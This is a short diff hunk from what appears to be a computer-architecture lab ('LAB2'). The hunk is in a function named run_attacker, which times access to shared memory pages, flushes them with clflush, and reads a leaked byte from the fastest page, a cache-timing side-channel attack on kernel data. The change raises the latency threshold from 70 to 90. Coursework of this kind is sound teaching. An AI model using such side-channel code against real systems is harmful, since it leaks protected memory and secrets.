@@ -78,7 +78,7 @@ int run_attacker(int kernel_fd, char *shared_memory) {
             for (flush_offset = 0; flush_offset <  LAB2_SHARED_MEMORY_SIZE; flush_offset += 4096) {
                 dram_latency = time_access((void*)(shared_memory+flush_offset));
                 clflush((void*)(shared_memory+flush_offset));
-                if (dram_latency < 70){
+                if (dram_latency < 90){
                     leaked_byte = (char)(flush_offset / LAB2_PAGE_SIZE);
                     repeat = 0;
                 }
